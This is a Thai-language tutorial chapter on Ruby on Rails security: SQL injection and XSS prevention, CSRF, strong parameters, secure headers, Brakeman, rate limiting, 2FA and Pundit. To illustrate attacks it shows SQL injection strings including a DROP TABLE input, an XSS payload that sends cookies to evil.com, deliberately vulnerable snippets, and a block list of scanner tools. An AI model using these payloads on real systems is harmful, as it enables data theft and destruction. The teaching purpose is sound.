# Part 62: Security Best Practices ใน Ruby on Rails

## ขั้นตอนที่ 1351-1370: ความปลอดภัยของ Rails Application

---

## ขั้นตอนที่ 1351: OWASP Top 10 ใน Rails Context

### OWASP Top 10 (2021)

1. **A01: Broken Access Control** - Authorization ที่ผิดพลาด
2. **A02: Cryptographic Failures** - เข้ารหัสผิดพลาดหรือไม่เข้ารหัส
3. **A03: Injection** - SQL Injection, Command Injection
4. **A04: Insecure Design** - Design ที่ไม่ปลอดภัย
5. **A05: Security Misconfiguration** - ตั้งค่าไม่ถูกต้อง
6. **A06: Vulnerable Components** - ใช้ Library ที่มีช่องโหว่
7. **A07: Authentication Failures** - Authentication ที่อ่อนแอ
8. **A08: Software Integrity Failures** - Code/Data integrity
9. **A09: Logging Failures** - ไม่มี logging ที่ดี
10. **A10: SSRF** - Server-Side Request Forgery

---

## ขั้นตอนที่ 1352: SQL Injection Prevention

### ช่องโหว่ SQL Injection

```ruby
# VULNERABLE: string interpolation ใน SQL
User.where("name = '#{params[:name]}'")
# ผู้ไม่หวังดีส่ง: ' OR '1'='1
# ได้ query: WHERE name = '' OR '1'='1'
# → ดึง users ทั้งหมด!

User.where("id = #{params[:id]}")
# ส่ง: 1; DROP TABLE users; --
# → ลบ table!
```

### Safe Patterns

```ruby
# SAFE: ใช้ parameterized queries
User.where("name = ?", params[:name])
User.where(name: params[:name])
User.where("name = :name", name: params[:name])

# SAFE: ใช้ ActiveRecord methods
User.find_by(email: params[:email])
User.where(id: params[:id])

# SAFE: sanitize input
User.where("name LIKE ?", "%#{ActiveRecord::Base.sanitize_sql_like(params[:name])}%")
```

### Raw SQL Safety

```ruby
# SAFE: ใช้ sanitize_sql
query = ActiveRecord::Base.sanitize_sql(
  ["SELECT * FROM users WHERE id = ?", params[:id]]
)
ActiveRecord::Base.connection.execute(query)

# SAFE: ใช้ exec_query
ActiveRecord::Base.connection.exec_query(
  "SELECT * FROM users WHERE email = $1",
  "SQL",
  [params[:email]]
)
```

---

## ขั้นตอนที่ 1353: XSS Prevention

### XSS คืออะไร?

Cross-Site Scripting (XSS) คือการที่ผู้ไม่หวังดีแทรก JavaScript เข้าไปในหน้าเว็บ

```html
<!-- ถ้าไม่ escape: -->
<!-- user ส่งมา: <script>document.location='evil.com/steal?c='+document.cookie</script> -->
<!-- จะถูก execute เมื่อ user อื่นดู -->
```

### Rails Auto-escaping

Rails escape HTML โดยอัตโนมัติใน ERB

```erb
<%# SAFE: escape อัตโนมัติ %>
<%= @post.title %>
<%= user_input %>

<%# UNSAFE: ใช้ raw HTML โดยไม่ escape %>
<%== @post.body %>
<%= @post.body.html_safe %>
<%= raw(@post.body) %>
```

### เมื่อต้องการ render HTML

```ruby
# ใช้ sanitize helper
<%= sanitize(@post.body) %>

# กำหนด allowed tags
<%= sanitize(@post.body, tags: %w[p br b i u a], 
             attributes: %w[href title]) %>

# ใช้ ActionText (safe rich text)
<%= @post.rich_text_body %>
```

### Content Security Policy (CSP)

```ruby
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.default_src :self
  policy.font_src :self, "https://fonts.gstatic.com"
  policy.img_src :self, "https:", :data
  policy.object_src :none
  policy.script_src :self, "https://cdn.jsdelivr.net"
  policy.style_src :self, "https://fonts.googleapis.com"
  policy.connect_src :self, "wss://myapp.com"
  
  # Report violations
  if Rails.env.production?
    policy.report_uri "/csp-violation-report-endpoint"
  end
end

# Force HTTPS
config.force_ssl = true

# Secure Cookies
Rails.application.config.session_store :cookie_store, 
  key: '_session', 
  secure: Rails.env.production?,
  httponly: true,
  same_site: :strict
```

---

## ขั้นตอนที่ 1354: CSRF Protection

### Rails CSRF Protection

Rails ป้องกัน CSRF ด้วย authenticity token อัตโนมัติ

```ruby
# application_controller.rb
class ApplicationController < ActionController::Base
  protect_from_forgery with: :exception
  # หรือ
  protect_from_forgery with: :null_session  # สำหรับ API
  # หรือ
  protect_from_forgery with: :reset_session
end

# ปิดสำหรับ API controllers
class Api::BaseController < ActionController::API
  # ActionController::API ไม่มี CSRF protection โดย default
end
```

### CSRF Token ใน Forms

```erb
<%# Rails ใส่ token อัตโนมัติ %>
<%= form_with model: @post do |f| %>
  <%# จะมี: <input type="hidden" name="authenticity_token" value="xxx"> %>
  <%= f.text_field :title %>
  <%= f.submit %>
<% end %>

<%# ใน JavaScript/fetch %>
<meta name="csrf-token" content="<%= form_authenticity_token %>">
```

```javascript
// JavaScript fetch พร้อม CSRF token
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

fetch('/posts', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken
  },
  body: JSON.stringify({ title: 'New Post' })
});
```

---

## ขั้นตอนที่ 1355: Mass Assignment (Strong Parameters)

```ruby
# VULNERABLE: allow all params
def create
  @user = User.new(params[:user])  # ผู้ไม่หวังดีส่ง admin: true
  @user.save
end

# SAFE: Strong Parameters
def create
  @user = User.new(user_params)
  @user.save
end

private

def user_params
  params.require(:user).permit(:name, :email, :password, :password_confirmation)
  # ไม่ permit: :admin, :role, :confirmed_at
end
```

### Complex Strong Parameters

```ruby
def post_params
  params.require(:post).permit(
    :title, :body, :status, :published_at,
    # nested attributes
    images: [],  # array
    tag_ids: [],
    metadata: [:key, :value],
    address_attributes: [:street, :city, :country]
  )
end

# Dynamic permitted params (เช่น Admin อนุญาตมากกว่า)
def post_params
  permitted = [:title, :body, :status]
  permitted += [:featured, :pinned] if current_user.admin?
  params.require(:post).permit(permitted)
end
```

---

## ขั้นตอนที่ 1356: Secure Headers Gem

```ruby
# Gemfile
gem 'secure_headers'

# config/initializers/secure_headers.rb
SecureHeaders::Configuration.default do |config|
  config.cookies = {
    secure: true,
    httponly: true,
    samesite: {
      strict: true
    }
  }
  
  config.x_frame_options = "SAMEORIGIN"
  config.x_content_type_options = "nosniff"
  config.x_xss_protection = "1; mode=block"
  config.x_download_options = "noopen"
  config.x_permitted_cross_domain_policies = "none"
  config.referrer_policy = "strict-origin-when-cross-origin"
  
  config.hsts = "max-age=31536000; includeSubDomains; preload"
  
  config.csp = {
    default_src: %w['self'],
    img_src: %w['self' data: https:],
    script_src: %w['self' 'nonce'],
    style_src: %w['self' 'unsafe-inline' https://fonts.googleapis.com],
    font_src: %w['self' https://fonts.gstatic.com],
    object_src: %w['none'],
    connect_src: %w['self'],
    report_uri: %w[https://myapp.com/csp-report]
  }
end
```

---

## ขั้นตอนที่ 1357: Brakeman Security Analysis

```ruby
# Gemfile
gem 'brakeman', require: false, group: :development
```

```bash
# รัน Brakeman
bundle exec brakeman

# รัน พร้อม output รูปแบบต่างๆ
bundle exec brakeman -o output.html
bundle exec brakeman -o output.json
bundle exec brakeman --format table

# รัน เฉพาะ checks บางอย่าง
bundle exec brakeman --test SqlInjection,CrossSiteScripting

# ตั้งค่า confidence level
bundle exec brakeman -w 2  # warning level 2 (medium)

# Ignore บาง warnings
bundle exec brakeman --ignore-config config/brakeman.ignore
```

### Brakeman Configuration

```yaml
# config/brakeman.yml
---
:ignore_model_output: false
:check_arguments: true
:run_all_checks: true
:output_format: :text
:confidence_threshold: 2
```

### Common Brakeman Warnings

```ruby
# 1. SQL Injection
User.where("name = '#{params[:name]}'")  # WARNING!
# Fix:
User.where("name = ?", params[:name])

# 2. Mass Assignment
User.new(params[:user])  # WARNING!
# Fix:
User.new(user_params)

# 3. Redirect
redirect_to params[:return_url]  # WARNING! Open redirect
# Fix:
redirect_to posts_path  # static path

# 4. Dynamic render
render params[:template]  # WARNING!
# Fix:
render 'specific_template'

# 5. File Access
File.read(params[:file])  # WARNING!
# Fix:
ALLOWED_FILES = %w[report1 report2]
if ALLOWED_FILES.include?(params[:file])
  File.read("reports/#{params[:file]}.pdf")
end
```

---

## ขั้นตอนที่ 1358: Secrets Management

### Rails Credentials

```bash
# สร้าง credentials
rails credentials:edit

# ใช้ specific editor
EDITOR=nano rails credentials:edit

# ดูค่า
rails credentials:show

# Environment-specific
rails credentials:edit --environment production
```

```yaml
# config/credentials.yml.enc
secret_key_base: xxx

database:
  password: xxx

aws:
  access_key_id: xxx
  secret_access_key: xxx

stripe:
  secret_key: sk_live_xxx
  webhook_secret: whsec_xxx
```

```ruby
# ใช้งาน
Rails.application.credentials.secret_key_base
Rails.application.credentials.aws[:access_key_id]
Rails.application.credentials.dig(:stripe, :secret_key)
```

### Environment Variables Best Practices

```ruby
# config/application.rb
module MyApp
  class Application < Rails::Application
    # Validate required env vars ตอน startup
    REQUIRED_ENV_VARS = %w[
      DATABASE_URL
      SECRET_KEY_BASE
      STRIPE_SECRET_KEY
      AWS_ACCESS_KEY_ID
      AWS_SECRET_ACCESS_KEY
    ]
    
    REQUIRED_ENV_VARS.each do |var|
      if ENV[var].blank? && Rails.env.production?
        raise "Required environment variable '#{var}' is not set!"
      end
    end
  end
end
```

---

## ขั้นตอนที่ 1359: Rate Limiting ด้วย Rack::Attack

```ruby
# Gemfile
gem 'rack-attack'

# config/initializers/rack_attack.rb
class Rack::Attack
  # Throttle: จำกัด requests ต่อ IP
  throttle("req/ip", limit: 300, period: 5.minutes) do |req|
    req.ip unless req.path.start_with?('/assets')
  end
  
  # Throttle: จำกัด Login attempts
  throttle("logins/ip", limit: 5, period: 20.seconds) do |req|
    if req.path == '/users/sign_in' && req.post?
      req.ip
    end
  end
  
  # Throttle: ตาม email
  throttle("logins/email", limit: 5, period: 20.seconds) do |req|
    if req.path == '/users/sign_in' && req.post?
      req.params['email'].to_s.downcase.gsub(/\s+/, "").presence
    end
  end
  
  # Throttle: API calls
  throttle("api/ip", limit: 100, period: 1.hour) do |req|
    req.ip if req.path.start_with?('/api')
  end
  
  # Block: suspicious requests
  blocklist("block bad actors") do |req|
    BlockedIP.exists?(ip: req.ip)
  end
  
  # Block: bad user agents
  blocklist("block bad bots") do |req|
    req.user_agent =~ /masscan|sqlmap|nikto/i
  end
  
  # Safelist: ไม่ throttle admin users
  safelist("allow from admin") do |req|
    req.ip == "127.0.0.1"
  end
  
  # Custom response สำหรับ throttled requests
  throttled_responder = lambda do |req|
    retry_after = (req.env["rack.attack.match_data"] || {})[:period]
    [
      429,
      {
        "Content-Type" => "application/json",
        "Retry-After" => retry_after.to_s
      },
      [{ error: "Too many requests. Please retry after #{retry_after} seconds." }.to_json]
    ]
  end
  
  self.throttled_responder = throttled_responder
end

# ใช้ Redis สำหรับ store
Rack::Attack.cache.store = ActiveSupport::Cache::RedisCacheStore.new(
  url: ENV['REDIS_URL']
)

# Rack middleware
# config/application.rb
config.middleware.use Rack::Attack
```

---

## ขั้นตอนที่ 1360: Two-Factor Authentication

```ruby
# Gemfile
gem 'devise'
gem 'devise-two-factor'
gem 'rqrcode'

# Model
class User < ApplicationRecord
  devise :two_factor_authenticatable,
         :otp_secret_encryption_key => ENV['OTP_SECRET_ENCRYPTION_KEY']
  
  before_create :generate_otp_secret
  
  def generate_otp_secret
    self.otp_secret = User.generate_otp_secret
    self.otp_required_for_login = false
  end
end

# Migration
add_column :users, :otp_secret, :string
add_column :users, :otp_required_for_login, :boolean, default: false
add_column :users, :otp_backup_codes, :text
```

```ruby
# Controllers
class TwoFactorController < ApplicationController
  before_action :authenticate_user!
  
  def show
    @qr_code = generate_qr_code(current_user)
  end
  
  def enable
    if current_user.validate_and_consume_otp!(params[:otp_code])
      current_user.update!(otp_required_for_login: true)
      @backup_codes = current_user.generate_otp_backup_codes!
      current_user.save!
      
      flash[:success] = "เปิดใช้งาน 2FA สำเร็จ"
      redirect_to account_security_path
    else
      flash[:error] = "รหัส OTP ไม่ถูกต้อง"
      redirect_to two_factor_path
    end
  end
  
  def disable
    if current_user.validate_and_consume_otp!(params[:otp_code])
      current_user.update!(
        otp_required_for_login: false,
        otp_secret: User.generate_otp_secret
      )
      flash[:success] = "ปิดใช้งาน 2FA แล้ว"
    else
      flash[:error] = "รหัส OTP ไม่ถูกต้อง"
    end
    redirect_to account_security_path
  end
  
  private
  
  def generate_qr_code(user)
    issuer = "MyApp"
    label = user.email
    
    uri = user.otp_provisioning_uri(label, issuer: issuer)
    
    qrcode = RQRCode::QRCode.new(uri)
    qrcode.as_svg(
      offset: 0,
      color: '000',
      shape_rendering: 'crispEdges',
      module_size: 4,
      standalone: true
    )
  end
end
```

---

## ขั้นตอนที่ 1361-1365: Authorization Security

### Pundit Authorization

```ruby
# Gemfile
gem 'pundit'

# app/policies/application_policy.rb
class ApplicationPolicy
  attr_reader :user, :record
  
  def initialize(user, record)
    @user = user
    @record = record
  end
  
  def index?   = false
  def show?    = false
  def create?  = false
  def update?  = false
  def destroy? = false
  
  class Scope
    def initialize(user, scope)
      @user = user
      @scope = scope
    end
    
    def resolve
      raise NotImplementedError, "#{self.class}#resolve ยังไม่ได้ implement"
    end
    
    private
    
    attr_reader :user, :scope
  end
end

# app/policies/post_policy.rb
class PostPolicy < ApplicationPolicy
  class Scope < Scope
    def resolve
      if user.admin?
        scope.all
      else
        scope.where(status: 'published')
          .or(scope.where(user: user))
      end
    end
  end
  
  def index?   = true
  def show?    = record.published? || owner? || admin?
  def create?  = user.present?
  def update?  = owner? || admin? || moderator?
  def destroy? = owner? || admin?
  def publish? = owner? || admin?
  def feature? = admin?
  
  private
  
  def owner?   = user == record.user
  def admin?   = user&.admin?
  def moderator? = user&.moderator?
end
```

```ruby
# ApplicationController
class ApplicationController < ActionController::Base
  include Pundit::Authorization
  
  rescue_from Pundit::NotAuthorizedError, with: :user_not_authorized
  
  private
  
  def user_not_authorized
    flash[:alert] = "คุณไม่มีสิทธิ์ดำเนินการนี้"
    redirect_back(fallback_location: root_path)
  end
end

# PostsController
class PostsController < ApplicationController
  def show
    @post = Post.find(params[:id])
    authorize @post  # ตรวจสอบ show? policy
  end
  
  def index
    @posts = policy_scope(Post)  # ใช้ Scope
  end
  
  def update
    @post = Post.find(params[:id])
    authorize @post
    
    if @post.update(post_params)
      redirect_to @post
    else
      render :edit
    end
  end
end
```

---

## ขั้นตอนที่ 1366-1370: Security Monitoring

### Audit Logging

```ruby
# app/models/concerns/auditable.rb
module Auditable
  extend ActiveSupport::Concern
  
  included do
    has_many :audit_logs, as: :auditable, dependent: :destroy
    
    after_create  :log_create
    after_update  :log_update
    before_destroy :log_destroy
  end
  
  private
  
  def log_create
    AuditLog.create!(
      auditable: self,
      action: "created",
      user: Current.user,
      changes: attributes
    )
  end
  
  def log_update
    return unless saved_changes.any?
    
    AuditLog.create!(
      auditable: self,
      action: "updated",
      user: Current.user,
      changes: saved_changes
    )
  end
  
  def log_destroy
    AuditLog.create!(
      auditable: self,
      action: "deleted",
      user: Current.user,
      changes: attributes
    )
  end
end
```

### Security Event Monitoring

```ruby
# app/services/security_monitor.rb
class SecurityMonitor
  def self.log_failed_login(email:, ip:)
    Rails.logger.warn("[SECURITY] Failed login attempt: email=#{email} ip=#{ip}")
    
    # Track failed attempts
    redis_key = "failed_logins:#{email}"
    count = Redis.current.incr(redis_key)
    Redis.current.expire(redis_key, 1.hour.to_i)
    
    # Alert จำนวนมาก
    if count >= 5
      SecurityAlertMailer.multiple_failed_logins(email: email, count: count).deliver_later
    end
  end
  
  def self.log_suspicious_activity(user:, action:, details: {})
    Rails.logger.warn("[SECURITY] Suspicious activity: user=#{user.id} action=#{action} details=#{details}")
    
    SecurityEvent.create!(
      user: user,
      action: action,
      details: details,
      ip_address: Current.ip,
      user_agent: Current.user_agent
    )
  end
end
```

---

## แบบฝึกหัดที่ 1-20

### แบบฝึกหัดที่ 1
ค้นหา SQL Injection vulnerabilities ในโค้ดและแก้ไข

### แบบฝึกหัดที่ 2
ตั้งค่า Content Security Policy

### แบบฝึกหัดที่ 3
เพิ่ม Strong Parameters สำหรับทุก form

### แบบฝึกหัดที่ 4
ติดตั้งและรัน Brakeman แล้วแก้ warnings

### แบบฝึกหัดที่ 5
ตั้งค่า Secure Headers

### แบบฝึกหัดที่ 6
ตั้งค่า Rate Limiting ด้วย Rack::Attack

### แบบฝึกหัดที่ 7
Implement Two-Factor Authentication

### แบบฝึกหัดที่ 8
ตั้งค่า Pundit Authorization สำหรับ Blog app

### แบบฝึกหัดที่ 9
สร้าง Audit Log system

### แบบฝึกหัดที่ 10
ตั้งค่า Rails Credentials สำหรับ secrets

### แบบฝึกหัดที่ 11
เพิ่ม Security Headers ใน Nginx

### แบบฝึกหัดที่ 12
ตั้งค่า Brute Force Protection

### แบบฝึกหัดที่ 13
ทำ Security Audit ด้วย bundle-audit

### แบบฝึกหัดที่ 14
ตั้งค่า HTTP Strict Transport Security (HSTS)

### แบบฝึกหัดที่ 15
ป้องกัน Path Traversal attacks

### แบบฝึกหัดที่ 16
ตั้งค่า Subresource Integrity (SRI)

### แบบฝึกหัดที่ 17
สร้าง Security Test suite

### แบบฝึกหัดที่ 18
ตั้งค่า CORS สำหรับ API

### แบบฝึกหัดที่ 19
ป้องกัน Mass Assignment ทุก controller

### แบบฝึกหัดที่ 20
Security Hardening checklist:
- Force HTTPS
- Secure cookies
- CSP headers
- CSRF protection
- Rate limiting
- Input validation
- Error handling (ไม่รั่ว info)
- Dependency audit
- Secrets management

---

## สรุป Part 62

เราได้เรียนรู้:
1. OWASP Top 10 ใน Rails context
2. SQL Injection prevention
3. XSS prevention และ CSP
4. CSRF protection
5. Strong Parameters
6. Secure Headers gem
7. Brakeman static analysis
8. Secrets management
9. Rate limiting ด้วย Rack::Attack
10. Two-Factor Authentication
11. Authorization ด้วย Pundit
12. Security monitoring

Security ไม่ใช่สิ่งที่ทำครั้งเดียวแล้วจบ ต้องทำเป็น practice ต่อเนื่องและ review สม่ำเสมอ
